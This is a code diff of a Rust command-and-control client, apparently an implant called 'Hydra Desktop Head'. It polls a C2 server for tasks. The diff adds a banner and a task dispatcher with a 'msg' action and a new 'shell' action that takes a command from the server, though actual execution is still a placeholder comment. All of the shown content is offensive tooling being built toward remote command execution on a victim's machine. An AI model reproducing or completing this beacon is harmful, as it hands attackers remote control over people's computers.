@@ -13,27 +13,45 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .use_rustls_tls()
         .build()?;
 
-    println!("[+] Hydra Desktop Head Active. Connecting to C2...");
+    println!(r#"
+    _    _           _              _____ ___  
+   | |  | |         | |            / ____|__ \ 
+   | |__| |_   _  __| |_ __ __ _  | |       ) |
+   |  __  | | | |/ _` | '__/ _` | | |      / / 
+   | |  | | |_| | (_| | | | (_| | | |____ / /_ 
+   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
+            __/ |                              
+           |___/                               
+    >> Desktop Head: Task Queue Active
+    "#);
 
     loop {
-        // Platform set to desktop so server knows which command to send
         let url = format!("{}/{}?platform=desktop", server_url, client_id);
 
         match client.post(&url).send().await {
             Ok(response) => {
                 if response.status().is_success() {
                     let body: Value = response.json().await?;
-                    println!("[*] C2 Response: {}", body);
-
-                    // --- COMMAND PARSER ---
+                    
+                    // --- TASK DISPATCHER ---
                     if let Some(command) = body.get("command") {
                         if !command.is_null() {
                             let action = command["action"].as_str().unwrap_or("");
-                            println!("[!] Executing Command: {}", action);
+                            let data = &command["data"];
 
-                            if action == "msg" {
-                                let content = command["content"].as_str().unwrap_or("No content");
-                                println!(">> MESSAGE FROM HYDRA: {}", content);
+                            println!("[!] Task Received: {}", action);
+
+                            match action {
+                                "msg" => {
+                                    let content = data["content"].as_str().unwrap_or("No content");
+                                    println!(">> MESSAGE FROM HYDRA: {}", content);
+                                }
+                                "shell" => {
+                                    let cmd_text = data["cmd"].as_str().unwrap_or("");
+                                    println!(">> [ACTION] Executing Shell: {}", cmd_text);
+                                    // Placeholder for actual command execution
+                                }
+                                _ => println!("[?] Unknown action: {}", action),
                             }
                         }
                     }
